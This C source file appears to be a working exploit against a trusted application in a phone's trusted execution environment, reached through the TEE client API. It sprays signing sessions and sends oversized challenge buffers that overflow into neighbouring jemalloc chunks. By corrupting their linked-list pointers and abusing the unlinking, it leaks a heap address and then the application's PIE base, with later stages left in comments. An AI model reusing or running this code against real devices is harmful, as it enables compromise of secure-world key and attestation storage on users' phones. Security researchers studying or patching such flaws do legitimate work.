#include <stdio.h>
#include <stdio.h>
#include <ctype.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
        system("ipcrm -M 0x13337");
        system("ipcrm -M 0x13338");
        system("ipcrm -M 0x13339");
        system("ipcrm -M 0x1333a");
#endif
}

TEEC_Context context;
TEEC_Session session;

void hexdump(const void *data, size_t size) {
    const uint8_t *p = (const uint8_t*)data;
    size_t offset = 0;

    while (offset < size) {
        // Print offset
        printf("%08zx  ", offset);

        // Print hex bytes (16 per line)
        for (size_t i = 0; i < 16; i++) {
            if (offset + i < size) {
                printf("%02x ", p[offset + i]);
            } else {
                printf("   ");
            }
            if (i == 7) printf(" "); // extra space in the middle
        }

        // Print ASCII representation
        printf(" |");
        for (size_t i = 0; i < 16 && offset + i < size; i++) {
            unsigned char c = p[offset + i];
            printf("%c", isprint(c) ? c : '.');
        }
        printf("|\n");

        offset += 16;
    }
}

#define max_chunks 30


typedef struct soter_chunk{
    size_t addr;
    size_t next;
    size_t prev;
    long session_id;
    bool next_clobbered;
    bool prev_clobbered;
    bool name_clobbered;
}soter_chunk; 

#define chunk_size 0x1c0
#define soter_list_head 0x12345678

size_t bucket_base = 0;
size_t initial_off = 0x1c0;
size_t curr_off = 0x1c0;
size_t freed_chunks = 0;
size_t heap_freelist[max_chunks];
soter_chunk* sessions[max_chunks];
size_t nr_sessions;

void* mem_area1;
void* mem_area2;
void* mem_area3;

#define UID 4
#define NAME "wowwowo"

void fixup_heap_base(size_t base){
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] != NULL){
            sessions[i]->addr += base; 
            if(sessions[i]->next != soter_list_head) sessions[i]->next += base; 
            if(sessions[i]->prev != soter_list_head) sessions[i]->prev += base; 
        }
    }
    for(size_t i=0; i<freed_chunks; i++){
        heap_freelist[i] += base; 
    }
}

size_t find_free(){
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] == NULL){
            return i;
        }
    }
    return NULL;
}

size_t get_index(soter_chunk* c){
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] != NULL && sessions[i]->session_id == c->session_id){
            return i;
        }
    }
    return -1;
}

soter_chunk* find_tail(){
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] != NULL && sessions[i]->next == soter_list_head){
            return sessions[i];
        }
    }
    return NULL;
}

soter_chunk* find_head(){
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] != NULL && sessions[i]->prev == soter_list_head){
            return sessions[i];
        }
    }
    return NULL; 
}

soter_chunk* find_session(long session_id){
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] != NULL && sessions[i]->session_id == session_id){
            return sessions[i];
        }
    }
    return NULL;
}

soter_chunk* find_addr(size_t addr){
    for(size_t i=0; i<max_chunks; i++){
       if(sessions[i] != NULL && sessions[i]->addr == addr){
            return sessions[i];
        } 
    }
    return NULL;
}

size_t get_list_pos(soter_chunk* chunk){
    size_t pos = 0;
    soter_chunk* curr = find_head();
    if(curr == NULL){
        printf("linked list empty!\n");
        abort();
    }
    if(curr->session_id == chunk->session_id){
        return pos;
    }
    while(curr->next != soter_list_head){
        pos += 1;
        curr = find_addr(curr->next);
        if(curr->session_id == chunk->session_id){
            return pos;
        }
    }
    abort();
}

void alloc_session(long session_id){
    //printf("alloc session 0x%lx\n", session_id);
    soter_chunk* new_chunk = (soter_chunk*)calloc(sizeof(soter_chunk), 1);
    if(freed_chunks == 0){
        new_chunk->addr = bucket_base + curr_off;
        curr_off += chunk_size;
    } else {
        new_chunk->addr = heap_freelist[freed_chunks-1];
        heap_freelist[freed_chunks-1] = NULL;
        freed_chunks -= 1;
    } 
    new_chunk->next_clobbered = false;
    new_chunk->prev_clobbered = false;
    new_chunk->session_id = session_id;
    new_chunk->next = soter_list_head;
    soter_chunk* tail = find_tail();
    if(tail == NULL){
        new_chunk->prev = soter_list_head;
    } else {
        new_chunk->prev = tail->addr;
        tail->next = new_chunk->addr;
    }
    size_t idx = find_free();
    sessions[idx] = new_chunk;
    nr_sessions += 1;
}

void free_session(long session_id){
    soter_chunk* chunk = find_session(session_id);
    if(chunk == NULL){
        printf("didn't find chunk for session 0x%lx\n", session_id);
    }
    heap_freelist[freed_chunks] = chunk->addr; 
    freed_chunks += 1;
    soter_chunk* prev = find_addr(chunk->prev);
    if(prev == NULL){
        if(chunk->prev_clobbered || chunk->next_clobbered){
            printf("[!!!!] clobbered soter_head [!!!!!]");
            abort();
        }
    } else {
        prev->next = chunk->next;
        if(chunk->prev_clobbered || chunk->next_clobbered){
            prev->next_clobbered = true;
        }
    }
     
    soter_chunk* next = find_addr(chunk->next);
    if(next == NULL){
        if(chunk->prev_clobbered || chunk->next_clobbered){
            printf("[!!!!] clobbered soter_head [!!!!!]");
            abort();
        }
    } else {
        next->prev = chunk->prev;
        if(chunk->prev_clobbered || chunk->next_clobbered){
            next->prev_clobbered = true;
        }
    }
    if(!chunk->prev_clobbered && !chunk->next_clobbered){
        // fixing the linked list
        if(next != NULL) next->prev_clobbered = false;
        if(prev != NULL) prev->next_clobbered = false;
    }
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] != NULL && sessions[i]->session_id == session_id){
            sessions[i] = NULL; 
            free(chunk);
        }
    } 
    nr_sessions -= 1;
}

void overflow_next(long session_id, char* overflow_data){
    soter_chunk* chunk = find_session(session_id);
    size_t overflow_chunk_addr = chunk->addr + chunk_size;
    soter_chunk* victim = find_addr(overflow_chunk_addr);
    if(victim != NULL){
        size_t mask = 0;
        for(int i=0; i<strlen(overflow_data)-0x1a8; i++){
            mask = mask | ((size_t)0xff<<(i*8));
        }
        size_t overflow_chars = mask & *(size_t*)&overflow_data[0x1a8];
        printf("mask: 0x%lx overflow chars: 0x%lx victim->next&mask: 0x%lx\n", mask, overflow_chars, victim->next & mask);
        if((victim->next & mask) == overflow_chars){
            // overflow actually fixes pointer
            victim->next_clobbered = false;
        } else {
            victim->next_clobbered = true;
        }
    }
}

void overflow_prev(long session_id, char* overflow_data){
    soter_chunk* chunk = find_session(session_id);
    size_t overflow_chunk_addr = chunk->addr + chunk_size;
    soter_chunk* victim = find_addr(overflow_chunk_addr);
    if(victim != NULL){
        size_t mask = 0;
        for(int i=0; i<strlen(overflow_data)-0x1b0; i++){
            mask = mask | ((size_t)0xff<<(i*8));
        }
        size_t overflow_chars = mask & *(size_t*)&overflow_data[0x1a8];
        printf("mask: 0x%lx overflow chars: 0x%lx victim->next&mask: 0x%lx\n", mask, overflow_chars, victim->next & mask);
        if((victim->next & mask) == overflow_chars){
            // overflow actually fixes pointer
            victim->prev_clobbered = false;
        } else {
            victim->prev_clobbered = true;
        }
    }
}

void dump_freelist(){
    puts("[heap]");
    for(int i=freed_chunks-1; i>=0; i--){
        printf("free chunk 0x%lx\n", heap_freelist[i]); 
    }
}

void dump_ll(){
    puts("[linked list]");
    soter_chunk* curr = find_head();
    if(curr == NULL){
        printf("linked list empty!\n");
        return;
    } 
    while(curr->next != soter_list_head){
        printf("[0x%lx] next:0x%lx prev:0x%lx clobbered %d,%d\n", curr->addr, curr->next, curr->prev, curr->next_clobbered, curr->prev_clobbered);
        curr = find_addr(curr->next);
    }
    printf("[0x%lx] next:0x%lx prev:0x%lx\n", curr->addr, curr->next, curr->prev);
}

TEEC_Result generate_ask()
{
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
    
	printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].value.a = UID;
    op.params[0].value.b = UID;

    TEEC_Result res = TEEC_InvokeCommand_impl(&session, 0x1004, &op, &err_origin);
    return res;
}

TEEC_Result generate_attk()
{
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
    
    op.params[0].value.a = 0x1;
    op.params[0].value.b = 0x1;

    TEEC_Result res = TEEC_InvokeCommand_impl(&session, 0x1000, &op, &err_origin);
    return res;
}

TEEC_Result generate_auth_key_pair()
{
        uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE);
   
    memset(mem_area2, 0, 0x10);
    strcpy(mem_area2, NAME);
    op.params[1].tmpref.buffer = mem_area2;  //name
    op.params[1].tmpref.size =  strlen(mem_area2); 
    op.params[0].value.a = UID;
    op.params[0].value.b = UID;

    TEEC_Result res = TEEC_InvokeCommand_impl(&session, 0x1008, &op, &err_origin);
    return res;
}

TEEC_Result init_sign(long* session_id)
{
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT);
   
    memset(mem_area3, 'A', 0x100); 
    memset(mem_area2, 0, 0x10);
    strcpy(mem_area2, NAME);
    op.params[3].tmpref.buffer = mem_area1;  
    op.params[3].tmpref.size =  0x370; 
    op.params[1].tmpref.buffer = mem_area2;  //name
    op.params[1].tmpref.size =  strlen(mem_area2); 
    op.params[2].tmpref.buffer = mem_area3; 
    op.params[2].tmpref.size =  strlen(mem_area3); 
    op.params[0].value.a = UID;
    op.params[0].value.b = UID;

    TEEC_Result res = TEEC_InvokeCommand_impl(&session, 0x100c, &op, &err_origin);
    //printf("session id: 0x%llx\n", *(long*)mem_area1);
    *session_id =  *(long*)mem_area1;
    alloc_session(*session_id);
    if(res != TEEC_SUCCESS) exit(-1);
    return res;
}

TEEC_Result init_sign_overflow(long* session_id, char* challenge)
{
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT);
  
    memcpy(mem_area3, challenge, strlen(challenge)); 
    memset(mem_area2, 0, 0x10);
    strcpy(mem_area2, NAME);
   
    bool next_overflow = false; 
    bool prev_overflow = false; 

    char* challenge_backup = (char*)calloc(strlen(mem_area3)+0x20, 1);
    memcpy(challenge_backup, mem_area3, strlen(mem_area3));

    if(strlen(mem_area3) > 0x1a8){
        next_overflow = true;
    }
    if(strlen(mem_area3) > 0x1b0){
        prev_overflow = true;
    }

	//printf("params: 0x%lx\n", op.paramTypes);
    op.params[3].tmpref.buffer = mem_area1;  
    op.params[3].tmpref.size =  0x370; 
    op.params[1].tmpref.buffer = mem_area2;  //name
    op.params[1].tmpref.size =  strlen(mem_area2); 
    op.params[2].tmpref.buffer = mem_area3; 
    op.params[2].tmpref.size =  strlen(challenge); 
    op.params[0].value.a = UID;
    op.params[0].value.b = UID;

    TEEC_Result res = TEEC_InvokeCommand_impl(&session, 0x100c, &op, &err_origin);
	//printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    //printf("session id: 0x%llx\n", *(long*)mem_area1);
    *session_id =  *(long*)mem_area1;
    alloc_session(*session_id);
    if(next_overflow) overflow_next(*session_id, challenge_backup);
    if(prev_overflow) overflow_prev(*session_id, challenge_backup);
    if(res != TEEC_SUCCESS) exit(-1);
    return res;
}

TEEC_Result finish_sign(long session_id, bool must_succeed)
{
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT,TEEC_MEMREF_TEMP_OUTPUT, TEEC_VALUE_INPUT);
    
	//printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].tmpref.buffer = mem_area1;  
    op.params[0].tmpref.size =  0x400; 
    op.params[1].tmpref.buffer = mem_area2; 
    op.params[1].tmpref.size =  0x300; 
    op.params[2].tmpref.buffer = mem_area3; 
    op.params[2].tmpref.size =  0x300; 
    op.params[3].value.a = 3;
    memcpy(op.params[0].tmpref.buffer, &session_id, 8); 

    TEEC_Result res = TEEC_InvokeCommand_impl(&session, 0x100d, &op, &err_origin);
	//printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    //printf("mem_area2 %s\n", mem_area2);
    //hexdump(mem_area2, 0x100);
    //printf("mem_area3 %s\n", mem_area3); 
    //hexdump(mem_area3, 0x300);
    free_session(session_id);
    if(must_succeed && res != TEEC_SUCCESS) exit(-1);
    return res;
}

soter_chunk* find_overflower(size_t idx, soter_chunk* victim){
    // look for a soter_session to overflow from
    // needs to be before the victim chunk
    // also can't overflow into any active chunk
    // look for active chunk
    for(size_t i=0; i<idx; i++){
        if(sessions[i] != NULL && sessions[i]->addr < victim->addr){
            bool overflows_active_chunk = false;
            for(size_t curr=sessions[i]->addr+chunk_size; curr<victim->addr; curr+=chunk_size){
                if(find_addr(curr)!=NULL) {
                    overflows_active_chunk = true;
                    break;
                }
            }
            if(!overflows_active_chunk){
                return sessions[i];
            }
        }
    }
    // look for free list entry
    size_t to_allocate = 0;
    bool found = false;
    for(size_t i=freed_chunks-1; i>=0; i--){
        if(heap_freelist[i] < victim->addr){
            bool overflows_active_chunk = false;
            for(size_t curr=heap_freelist[i]+chunk_size; curr<victim->addr; curr+=chunk_size){
                if(find_addr(curr)!=NULL) {
                    overflows_active_chunk = true;
                    break;
                }
            }
            if(!overflows_active_chunk){
                found = true;
                break; 
            }
        }
        to_allocate+=1;
    }
    long session_id;
    if(found){
        for(int i=0; i<to_allocate; i++){
            init_sign(&session_id);
        }
        init_sign(&session_id);
        return find_session(session_id); 
    }
    return NULL;
}

void fix_chunk(soter_chunk* curr){
    size_t i = get_index(curr);
    soter_chunk* ov = find_overflower(i, curr);
    if(ov == NULL){
        puts("failed to find overflower!!");
        abort();
    }
    finish_sign(ov->session_id, true);
    char* overflow_payload = (char*)calloc(0x200,1);
    memset(overflow_payload, 'A', 0x1a8);
    memcpy(&overflow_payload[0x1a8], &curr->next, sizeof(size_t));
    long session_id;
    init_sign_overflow(&session_id, overflow_payload);
    finish_sign(curr->session_id, true);
}

void fix_ll(){
    while(1){
        bool clobbered_found = false;
        for(size_t i=0; i<max_chunks; i++){
           if(sessions[i] != NULL && sessions[i]->next_clobbered){
                fix_chunk(sessions[i]); 
                clobbered_found = true;
           } 
        }
        if(!clobbered_found) return;
    }
}
void reset_ll(){
    long session_id;
    while(freed_chunks != 0){
        init_sign(&session_id); 
    }
    // free from max addr to min addr 
    size_t ok_off = 0;
    for(size_t i=0; i<=nr_sessions; i++){
        size_t addr = bucket_base+initial_off+i*chunk_size;
        soter_chunk* curr = find_addr(addr);
        size_t list_pos = get_list_pos(curr);
        if(list_pos == i) {
            ok_off += 1;
        } else {
            break;
        }
    } 
    for(size_t i=nr_sessions-1; i>0; i--){
        size_t addr = bucket_base+initial_off+i*chunk_size;
        soter_chunk* curr = find_addr(addr);
        size_t list_pos = get_list_pos(curr);
        if(list_pos != i) {
            finish_sign(curr->session_id, false);
        } else {
            if(i > ok_off){
                finish_sign(curr->session_id, false);
            }
        }
    }
    while(freed_chunks != 0){
        init_sign(&session_id); 
    }
}

int main(int argc, char **argv)
{
    char* ta = "377ee4e8-af0e-474f-a9d636a9268fe85c";
    TEEC_UUID *uuid = teegris_uuid(ta);

    uint32_t err_origin;
    TEEC_Result res;

	cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    mem_area1 = allocate_param_mem(&context, 0x1000);
    mem_area2 = allocate_param_mem(&context, 0x1000);
    mem_area3 = allocate_param_mem(&context, 0x3000);
    #define nr_spray 10
    long session_ids[nr_spray];
    long session_id;
     
    printf("[+] generating ask...\n");
    res = generate_ask(); 
    if(res != TEEC_SUCCESS){
        printf("generate_ask failed: 0x%x\n", res);
        return -1;
    }
    printf("[+] generating attk...\n");
    res = generate_attk(); 
    if(res != TEEC_SUCCESS){
        printf("generate_attk failed: 0x%x\n", res);
        return -1;
    }
    printf("[+] generating auth key...\n");
    res = generate_auth_key_pair();
    if(res != TEEC_SUCCESS){
        printf("generate_auth_key_pair failed: 0x%x\n", res);
        return -1;
    }    
    char* spray_data = (char*)malloc(0x100);
    memset(spray_data, 0, 0x100);
    for(int i=0; i<nr_spray; i++){
        memset(spray_data, 0x41+i, 0xf8+6);
        init_sign_overflow(&session_id, spray_data);
        session_ids[i] = session_id;
    }
    dump_ll();
    /*
    overflow into another chunk
    clobber the next pointer such that on unlinking 
    writes the prev pointer into the challenge of 
    another chunk
    */
    res = finish_sign(session_ids[4], true);
    res = finish_sign(session_ids[6], true);
    init_sign(&session_id);
    session_ids[6] = session_id;
    init_sign(&session_id);
    session_ids[4] = session_id;
    // first overflow session
    res = finish_sign(session_ids[5], true);
    char* overflow_payload = (char*)malloc(0x800);
    memset(overflow_payload, 0, 0x800);
    memset(overflow_payload, 'A', 0x1a8);
    overflow_payload[0x1a8] = 0x8;
    printf("overflow wiuth %x\n", strlen(overflow_payload));
    init_sign_overflow(&session_id, overflow_payload);
    dump_ll();
    session_ids[5] = session_id;
    // unlink into other challenge
    res = finish_sign(session_ids[6], true);
    // leak
    dump_ll();
    res = finish_sign(session_ids[3], true);
    dump_ll();
    hexdump(mem_area2, 0x140);
    size_t heap_leak;
    memcpy(&heap_leak, &mem_area2[0x100], 6);
    printf("[+] heap leak: 0x%lx\n", heap_leak);
    bucket_base = heap_leak - 0x1180;
    printf("[+] jemalloc bucket base: 0x%lx\n", bucket_base);
    fixup_heap_base(bucket_base);
    size_t first_chunk = bucket_base + 0x1c0;

    fix_ll();
    reset_ll(); 
    dump_ll();
   
    size_t leak_c_addr =  bucket_base + initial_off + 8*chunk_size;
    size_t leak_c_unlink_addr =  bucket_base + initial_off + 8*chunk_size - 8;
    soter_chunk* leak_c = find_addr(leak_c_addr);
    soter_chunk* fixup_next_c = find_addr(bucket_base + initial_off + 7*chunk_size);
    soter_chunk* fixup_prev = find_addr(bucket_base + initial_off + 5*chunk_size);
    soter_chunk* ov_c = find_addr(bucket_base + initial_off + 6*chunk_size);
    soter_chunk* unlink_c = find_addr(bucket_base + initial_off + 3*chunk_size);
    soter_chunk* unlink_ov_c = find_addr(bucket_base + initial_off + 2*chunk_size);
    soter_chunk* unlink_ov_fixup_c = find_addr(bucket_base + initial_off + 0*chunk_size);
    soter_chunk* noidea = find_addr(bucket_base + initial_off + 1*chunk_size);
    // make space before overflow chunk
    finish_sign(fixup_next_c->session_id, true);
    // overflow into size of leak_c
    finish_sign(ov_c->session_id, true);
    memset(overflow_payload, 'A', 0x2c0+chunk_size); 
    overflow_payload[0x2c0+chunk_size] = 0x10;
    overflow_payload[0x2c1+chunk_size] = 0x2; 
    init_sign_overflow(&session_id, overflow_payload);
    // fix prev of overflown chunk
    finish_sign(fixup_prev->session_id, false);   

    // unlink to get null bytes into next of overflow
    memset(overflow_payload, 0, 0x300); 
    memset(overflow_payload, 'A', 0x1a8); 
    memcpy(&overflow_payload[0x1a8], &leak_c_unlink_addr, sizeof(size_t));
    finish_sign(unlink_ov_c->session_id, false);
    init_sign_overflow(&session_id, overflow_payload);
    finish_sign(unlink_c->session_id, false);
    finish_sign(unlink_ov_fixup_c->session_id, false);
    size_t wtf = bucket_base + initial_off + 4*chunk_size;
    memcpy(&overflow_payload[0x1a8], &wtf, sizeof(size_t));
    init_sign_overflow(&session_id, overflow_payload);
    finish_sign(noidea->session_id, false); 
    // fix next 
    init_sign(&session_id);
    init_sign(&session_id);
    init_sign(&session_id);
    size_t final_c = bucket_base + initial_off + 9*chunk_size;
    memcpy(&overflow_payload[0x1a8], &final_c, sizeof(size_t));
    init_sign_overflow(&session_id, overflow_payload);
    
    // pop free list from behind
    for(int i=7; i>=0; i--){
        finish_sign(find_addr(bucket_base + initial_off + i*chunk_size)->session_id, false);
    }

    leak_c->session_id = 0x4141414141414141; // we've overflown the session_id
    finish_sign(leak_c->session_id, true);
    hexdump(mem_area2, 0x300);
    size_t pie_leak;
    memcpy(&pie_leak, &mem_area2[0x1b0], sizeof(size_t));
    size_t pie = pie_leak - 0x77008;
    printf("! pie: 0x%lx\n", pie);

    reset_ll();
    dump_ll();
    dump_freelist();
     
    /*
    init_sign(&session_id);
    // overflow size of following chunk
    memset(overflow_payload, 'A', 0x2c0); 
    overflow_payload[0x2c0] = 0x80;
    overflow_payload[0x2c1] = 0x4;
    dump_ll();
    
    dump_ll();

    init_sign_overflow(&session_id, overflow_payload);
    // look for oveflowed chunk
    soter_chunk* leak_target = NULL;
    for(size_t i=0; i<max_chunks; i++){
        if(sessions[i] != NULL && sessions[i]->next_clobbered && sessions[i]->prev_clobbered){
            leak_target = sessions[i];
            break; 
        }
    }
    // fix prev by unlinking previous chunk
    soter_chunk* prev_leak = find_addr(leak_target->prev);
    finish_sign(prev_leak->session_id, true);  
    // find chunk to overflow from
    soter_chunk* unlink_ov = find_addr(bucket_base + 2*chunk_size);
    finish_sign(unlink_ov->session_id, true);
    memset(overflow_payload, 0, 0x300);
    memset(overflow_payload, 'A', 0x1a8);
    size_t next_target = leak_target->addr-8;
    printf("next target 0x%lx\n", next_target);
    memcpy(&overflow_payload[0x1a8], &next_target, sizeof(size_t)); 
    init_sign_overflow(&session_id, overflow_payload);

    dump_ll();
    dump_freelist();
    */
 
    /*
    finish_sign(sessions[8], true);
    overflow_payload[0x1a8] = 0xc0;
    init_sign_overflow(&session_id, overflow_payload);
    sessions[8] = session_id;
    dump_ll();
    finish_sign(sessions[9], true);
    */

     

    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
